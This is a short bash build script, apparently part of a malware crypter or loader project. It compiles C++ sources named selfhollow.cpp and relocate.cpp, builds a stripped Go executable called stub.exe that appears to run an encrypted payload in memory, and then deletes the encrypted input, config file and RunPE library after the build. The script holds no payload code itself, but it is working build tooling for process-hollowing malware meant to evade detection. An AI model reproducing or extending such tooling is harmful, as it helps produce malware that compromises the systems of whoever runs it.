#!/bin/bash

echo "=== go curl memexec builder ==="

# Make sure the script is executable
chmod +x build.sh

# Build the C++ library first
echo "Building C++ library..."
# Note: ./build.sh must be updated to compile and link cpp/relocate.cpp
# alongside cpp/selfhollow.cpp for the relocation feature.
./build.sh
if [ $? -ne 0 ]; then
    echo "Failed to build C++ library."
    exit 1
fi

# Now build the Go application
echo "Building Go application..."
go mod tidy
go build -ldflags="-s -w" -o stub.exe
if [ $? -ne 0 ]; then
    echo "Failed to build Go application."
    exit 1
fi

echo "Build completed successfully!"
echo "Output binary: stub.exe"

# Clean up sensitive files after successful build
echo "Cleaning up sensitive files..."
if [ -f "encrypted_Input.bin" ]; then
    rm -f encrypted_Input.bin
    echo "Removed encrypted_Input.bin"
fi

if [ -f "config.txt" ]; then
    rm -f config.txt
    echo "Removed config.txt"
fi

if [ -f "librunpe.a" ]; then
    rm -f librunpe.a
    echo "Removed librunpe.a"
fi

echo "Cleanup completed."
